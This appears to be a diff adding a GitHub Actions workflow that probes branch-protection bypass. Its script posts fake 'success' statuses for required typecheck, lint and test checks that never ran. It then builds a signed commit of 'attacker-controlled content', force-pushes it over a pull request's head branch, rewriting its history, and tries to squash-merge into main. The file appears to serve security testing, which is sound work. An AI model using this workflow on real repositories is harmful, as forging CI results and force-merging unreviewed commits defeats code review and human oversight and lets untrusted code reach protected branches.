@@ -1,0 +1,52 @@
+name: Probe2
+on:
+  workflow_dispatch:
+    inputs:
+      pr: {required: true, type: string}
+      branch: {required: true, type: string}
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@v7
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            const pr=Number('${{ inputs.pr }}'), branch='${{ inputs.branch }}';
+            const {owner,repo}=context.repo;
+            const Q=`query($o:String!,$r:String!,$n:Int!){repository(owner:$o,name:$r){pullRequest(number:$n){
+              reviewDecision mergeable mergeStateStatus headRefOid}}}`;
+            const look=async l=>{const d=await github.graphql(Q,{o:owner,r:repo,n:pr});const p=d.repository.pullRequest;
+              core.info(`${l} decision=${p.reviewDecision} mergeable=${p.mergeable} state=${p.mergeStateStatus} head=${p.headRefOid.slice(0,8)}`);return p;};
+            const checks=async sha=>{for(const c of ['typecheck','lint','test'])
+              await github.rest.repos.createCommitStatus({owner,repo,sha,state:'success',context:c,description:'posted by the workflow token'});};
+
+            const a=await look('A-START');
+            // 1. satisfy the required checks on the UNSIGNED head, to isolate what is blocking
+            await checks(a.headRefOid); await new Promise(r=>setTimeout(r,9000));
+            await look('B-CHECKS-ON-UNSIGNED-HEAD');
+
+            // 2. the attacker's way around it: rebuild the branch as a single signed commit
+            const main=await github.rest.repos.getCommit({owner,repo,ref:'main'});
+            const tmp='rebuild-'+Date.now();
+            await github.rest.git.createRef({owner,repo,ref:`refs/heads/${tmp}`,sha:main.data.sha});
+            const made=await github.graphql(`mutation($in:CreateCommitOnBranchInput!){createCommitOnBranch(input:$in){commit{oid}}}`,{
+              in:{branch:{repositoryNameWithOwner:`${owner}/${repo}`,branchName:tmp},expectedHeadOid:main.data.sha,
+                  message:{headline:'attacker-controlled content'},
+                  fileChanges:{additions:[{path:'PAYLOAD2',contents:Buffer.from('owned\n').toString('base64')}]}}});
+            const sha=made.createCommitOnBranch.commit.oid;
+            const v=await github.rest.repos.getCommit({owner,repo,ref:sha});
+            core.info(`REBUILT ${sha.slice(0,8)} verified=${v.data.commit.verification.verified}`);
+            // force the PR head branch onto it, rewriting history
+            await github.rest.git.updateRef({owner,repo,ref:`heads/${branch}`,sha,force:true});
+            core.info('FORCE-PUSHED the PR head branch');
+            await new Promise(r=>setTimeout(r,9000));
+            await look('C-AFTER-FORCE-PUSH');
+
+            await checks(sha); await new Promise(r=>setTimeout(r,9000));
+            const d=await look('D-AFTER-CHECKS');
+            try{const m=await github.rest.pulls.merge({owner,repo,pull_number:pr,merge_method:'squash'});
+              core.info(`MERGE merged=${m.data.merged} sha=${m.data.sha.slice(0,8)}`);}
+            catch(e){core.info(`MERGE failed ${e.status} ${e.message}`);}
+            const mm=await github.rest.repos.getCommit({owner,repo,ref:'main'});
+            core.info(`MAIN ${mm.data.sha.slice(0,8)} ${mm.data.commit.message.split('\n')[0]}`);
